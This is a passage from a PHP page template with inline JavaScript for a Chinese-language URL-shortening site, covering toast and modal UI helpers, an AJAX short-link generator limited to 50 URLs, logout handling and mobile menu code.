                    const messageEl = this.createElement('div', {
                        style: `
                            font-size: 14px;
                            color: #666;
                        `,
                        text: message
                    });
                    
                    content.appendChild(titleEl);
                    content.appendChild(messageEl);
                    
                    // 创建关闭按钮
                    const closeBtn = this.createElement('button', {
                        style: `
                            background: none;
                            border: none;
                            color: #999;
                            cursor: pointer;
                            font-size: 18px;
                            padding: 5px;
                            line-height: 1;
                            align-self: flex-start;
                        `,
                        children: [
                            this.createElement('i', { className: 'bi bi-x' })
                        ]
                    });
                    
                    // 组装消息
                    toast.appendChild(iconContainer);
                    toast.appendChild(content);
                    toast.appendChild(closeBtn);
                    
                    // 添加到页面
                    document.body.appendChild(toast);
                    
                    // 显示动画
                    setTimeout(() => {
                        toast.style.opacity = '1';
                        toast.style.transform = 'translateX(-50%) translateY(0)';
                    }, 10);
                    
                    // 关闭函数
                    function close() {
                        toast.style.opacity = '0';
                        toast.style.transform = 'translateX(-50%) translateY(-20px)';
                        setTimeout(() => {
                            if (toast.parentNode) {
                                toast.parentNode.removeChild(toast);
                            }
                        }, 300);
                    }
                    
                    // 自动关闭
                    const timeout = setTimeout(close, 4000);
                    
                    // 关闭按钮事件
                    closeBtn.addEventListener('click', () => {
                        clearTimeout(timeout);
                        close();
                    });
                    
                    return { close };
                },
                
                /**
                 * 显示登录提示弹窗
                 * @returns {object} 弹窗对象
                 */
                showLoginModal() {
                    const modal = this.createModal({
                        title: '登录提示',
                        content: '请先登录后再使用生成功能，登录后您可以管理和追踪您生成的所有短链接。',
                        icon: {
                            name: 'bi-lock',
                            bgColor: 'rgba(46, 204, 113, 0.1)',
                            color: 'var(--primary)',
                            size: 80
                        },
                        buttons: [
                            this.createButton('取消', { primary: false }),
                            this.createButton('前往登录', {
                                primary: true,
                                icon: 'bi-box-arrow-in-right',
                                flex: 1.5,
                                onClick: () => {
                                    window.location.href = './user/login.php';
                                }
                            })
                        ]
                    });
                    
                    modal.show();
                    return modal;
                },
                
                /**
                 * 显示退出确认弹窗
                 * @param {Function} onConfirm - 确认回调
                 * @returns {object} 弹窗对象
                 */
                showLogoutConfirm(onConfirm) {
                    const modal = this.createModal({
                        title: '退出确认',
                        content: '您确定要退出登录吗？',
                        headerColor: 'linear-gradient(135deg, #F39C12 0%, #E67E22 100%)',
                        icon: {
                            name: 'bi-box-arrow-right',
                            bgColor: 'rgba(243, 156, 18, 0.15)',
                            color: '#F39C12',
                            size: 70
                        },
                        maxWidth: '380px',
                        buttons: [
                            this.createButton('取消', { primary: false }),
                            this.createButton('确认退出', {
                                primary: true,
                                gradient: 'linear-gradient(135deg, #F39C12 0%, #E67E22 100%)',
                                onClick: () => {
                                    modal.close();
                                    if (onConfirm) onConfirm();
                                }
                            })
                        ]
                    });
                    
                    modal.show();
                    return modal;
                }
            };
            
            /**
             * 生成短链接
             */
            function generateShortUrl() {
                console.log("生成短链接函数被调用");
                
                const longUrl = document.getElementById("longUrl").value.trim();
                const customAlias = document.getElementById("customAlias").value.trim();
                
                if (!longUrl) {
                    UIKit.showToast("请输入长链接！", "warning");
                    return;
                }
                
                <?php if($islogin2==1):?>
                // 已登录用户处理
                console.log("已登录用户，发送AJAX请求");
                
                // 将长链接放入数组，后端期望urls参数为数组
                const urlsArray = longUrl.split('\n').filter(url => url.trim() !== '');
                
                if (urlsArray.length === 0) {
                    UIKit.showToast("请输入有效的链接！", "warning");
                    return;
                }
                
                if (urlsArray.length > 50) {
                    UIKit.showToast("一次最多生成50个短网址", "warning");
                    return;
                }
                
                // 准备请求数据
                const formData = new FormData();
                urlsArray.forEach((url, index) => {
                    formData.append('urls[]', url);
                });
                formData.append('type', 'suiji');
                formData.append('pattern', '1');
                
                // 如果有自定义别名，添加到请求中
                if (customAlias) {
                    formData.append('custom_alias', customAlias);
                }
                
                // 使用原生JavaScript创建AJAX请求
                const xhr = new XMLHttpRequest();
                xhr.open("POST", "./user/ajax.php?act=creatUrls", true);
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4) {
                        if (xhr.status === 200) {
                            try {
                                const response = JSON.parse(xhr.responseText);
                                if (response.code === 0) {
                                    // 成功提示
                                    if (Array.isArray(response.data) && response.data.length > 0) {
                                        // 替换输入框中的链接为生成的短链接
                                        if (response.data.length === 1) {
                                            document.getElementById("longUrl").value = response.data[0];
                                            UIKit.showToast("短链接生成成功", "success");
                                        } else {
                                            // 多个链接的情况，按行替换
                                            let shortUrlsText = response.data.join('\n');
                                            document.getElementById("longUrl").value = shortUrlsText;
                                            UIKit.showToast("成功生成 " + response.data.length + " 个短链接", "success");
                                        }
                                        
                                        // 清空自定义别名框
                                        document.getElementById("customAlias").value = '';
                                    } else {
                                        UIKit.showToast("短链接生成成功", "success");
                                    }
                                } else {
                                    // 失败提示
                                    UIKit.showToast(response.msg || "未知错误", "error");
                                }
                            } catch (e) {
                                UIKit.showToast("处理响应时出错：" + e.message, "error");
                            }
                        } else {
                            UIKit.showToast("服务器错误，请稍后再试！", "error");
                        }
                    }
                };
                xhr.send(formData);
                <?php else:?>
                // 未登录用户处理
                console.log("用户未登录，显示登录提示");
                UIKit.showLoginModal();
                <?php endif;?>
            }
            
            /**
             * 退出登录并留在当前页面
             */
            function logoutAndStay() {
                UIKit.showLogoutConfirm(() => {
                    // 创建一个隐藏的iframe来执行退出操作
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = './user/login.php?my=logout&stay=1';
                    document.body.appendChild(iframe);
                    
                    // 监听iframe加载完成
                    iframe.onload = function() {
                        // 清除cookie并刷新页面
                        document.cookie = "user_token=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
                        
                        // 显示退出成功消息
                        UIKit.showToast('已成功退出登录', 'success');
                        
                        // 延迟一下再刷新页面，让用户看到提示
                        setTimeout(function() {
                            window.location.reload();
                        }, 1000);
                    };
                });
            }
            
            // 页面加载完成后执行
            document.addEventListener('DOMContentLoaded', function() {
                // 统计数字动画效果（简化版，不依赖CountUp.js）
                document.querySelectorAll('.counter').forEach(function(counter) {
                    const target = parseInt(counter.textContent || '0');
                    if (isNaN(target)) {
                        counter.textContent = '0';
                        return;
                    }
                    
                    const duration = 2000; // 2秒
                    const steps = 50;
                    const step = target / steps;
                    let current = 0;
                    let count = 0;
                    
                    const timer = setInterval(function() {
                        current += step;
                        count++;
                        
                        if (count >= steps) {
                            current = target;
                            clearInterval(timer);
                        }
                        
                        counter.textContent = Math.round(current).toLocaleString();
                    }, duration / steps);
                });
                
                // 初始化移动菜单
                initMobileMenu();
            });
            
            /**
             * 初始化移动端菜单
             */
            function initMobileMenu() {
                // 确保DOM完全加载后再初始化
                if (document.readyState === 'loading') {
                    document.addEventListener('DOMContentLoaded', initMobileMenuHandler);
                } else {
                    initMobileMenuHandler();
                }
            }
            
            /**
             * 实际处理移动菜单初始化的函数
             */
            function initMobileMenuHandler() {
                // 获取DOM元素
                const mobileMenuToggle = document.getElementById('mobileMenuToggle');
                const navLinks = document.getElementById('navLinks');
                
                if (!mobileMenuToggle || !navLinks) {
                    return;
                }
                
                // 创建遮罩层
                let overlay = document.querySelector('.navbar-overlay');
                if (!overlay) {
                    overlay = document.createElement('div');
                    overlay.className = 'navbar-overlay';
                    document.body.appendChild(overlay);
                }
                
                // 切换菜单函数
                function toggleMobileMenu(event) {
                    if (event) event.preventDefault();
                    navLinks.classList.toggle('active');
                    overlay.classList.toggle('active');
                    
                    // 如果菜单已打开，添加防止滚动
                    if (navLinks.classList.contains('active')) {
                        document.body.style.overflow = 'hidden';
                    } else {
                        document.body.style.overflow = '';
                    }
                }
                
                // 移除旧的事件监听器（如果存在）
                if (mobileMenuToggle._clickHandler) {
                    mobileMenuToggle.removeEventListener('click', mobileMenuToggle._clickHandler);
                }
                if (overlay._clickHandler) {
                    overlay.removeEventListener('click', overlay._clickHandler);
                }
                
                // 存储处理函数引用以便后续移除
                mobileMenuToggle._clickHandler = toggleMobileMenu;
                overlay._clickHandler = toggleMobileMenu;
                
                // 绑定新的事件监听器
                mobileMenuToggle.addEventListener('click', toggleMobileMenu);
                overlay.addEventListener('click', toggleMobileMenu);
                
                // 移动端用户下拉菜单
                const userMenuToggles = document.querySelectorAll('.user-menu-toggle');
                userMenuToggles.forEach(toggle => {
                    // 移除旧的事件监听器
                    if (toggle._clickHandler) {
                        toggle.removeEventListener('click', toggle._clickHandler);
                    }
                    
                    // 创建新的处理函数并存储引用
                    toggle._clickHandler = function(e) {
                        if (window.innerWidth <= 768) {
                            e.preventDefault();
                            const container = this.closest('.user-menu-container');
                            container.classList.toggle('active');
                        }
                    };
                    
                    // 绑定新事件监听器
                    toggle.addEventListener('click', toggle._clickHandler);
                });
                
                // 窗口尺寸变化时重置
                window.addEventListener('resize', function() {
                    if (window.innerWidth > 768 && navLinks.classList.contains('active')) {
                        navLinks.classList.remove('active');
                        overlay.classList.remove('active');
                        document.body.style.overflow = '';
                    }
                });
            }
        </script>
    </body>
    </html>
    <?php
    } else {
        // 对于其他模块，使用常规的模板加载
    $loadfile = Template::load($mod);
    include $loadfile;
    }
    ?>